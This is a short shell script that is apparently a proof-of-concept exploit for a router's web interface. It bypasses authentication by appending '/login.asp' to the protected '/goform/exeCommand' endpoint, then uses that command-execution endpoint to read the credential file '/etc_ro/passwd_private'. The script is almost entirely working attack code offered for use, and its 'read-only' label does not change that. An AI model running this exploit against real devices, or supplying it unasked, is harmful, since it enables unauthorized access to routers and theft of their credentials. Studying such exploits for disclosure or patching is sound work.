#!/bin/sh
# 01 — authentication bypass via the login.asp substring (read-only)
# usage: ./01_auth_bypass.sh http://192.168.0.1
R=${1:?usage: $0 http://<router>}
echo "[1] control (protected endpoint, no suffix):"
curl -s -o /dev/null -D - -X POST -d 'cmdinput=ls' "$R/goform/exeCommand" | sed -n '1p;/^Location/Ip'
echo "[2] bypass (same endpoint + /login.asp):"
curl -s -X POST --data-urlencode 'cmdinput=cat /etc_ro/passwd_private' "$R/goform/exeCommand/login.asp" | head -3
